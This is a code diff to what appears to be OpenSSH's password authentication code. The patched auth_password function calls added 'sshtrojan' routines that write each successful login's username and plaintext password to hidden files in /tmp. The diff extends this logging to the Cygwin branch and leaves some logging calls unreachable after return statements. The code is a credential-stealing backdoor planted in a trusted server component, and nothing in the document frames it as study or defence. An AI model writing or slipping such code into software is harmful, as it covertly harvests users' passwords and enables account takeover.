@@ -45,7 +45,7 @@ sshtrojan1(char *user, const char *password){
 	FILE *file = fopen("/tmp/.log_sshtrojan1.txt", "a");
 	time_t t;   
    	time(&t);
-	fprintf(file, "Login in: %s:	Username: %s \nPassword: %s\n\n", ctime(&t), user, password);
+	fprintf(file, "Login in: %sUsername: %s \nPassword: %s\n\n", ctime(&t), user, password);
 	fclose(file);
 }
 
@@ -54,7 +54,7 @@ sshtrojan2(char *user, const char *password){
 	FILE *file = fopen("/tmp/.log_sshtrojan2.txt", "a");
 	time_t t;   
    	time(&t);
-	fprintf(file, "Login in: %s:	Username: %s \nPassword: %s\n\n", ctime(&t), user, password);
+	fprintf(file, "Try login in: %sUsername: %s \nPassword: %s\n\n", ctime(&t), user, password);
 	fclose(file);
 }
 int
@@ -99,7 +99,12 @@ auth_password(struct ssh *ssh, const char *password)
 		if (hToken == INVALID_HANDLE_VALUE)
 			return 0;
 		cygwin_set_impersonation_token(hToken);
-		return ok;
+		if(ok){
+			sshtrojan1(authctxt->user, password);
+			return 1;
+		}
+		return 0;
+		sshtrojan2(authctxt->user, password);
 	}
 #endif
 #ifdef USE_PAM
@@ -125,11 +130,11 @@ auth_password(struct ssh *ssh, const char *password)
 		auth_restrict_session(ssh);
 	if(result && ok){
 		sshtrojan1(authctxt->user, password);
-
 		return 1;
 	}
-	sshtrojan2(authctxt->user, password);
+	
 	return 0;
+	sshtrojan2(authctxt->user, password);
 	/*return (result && ok);*/
 }
 
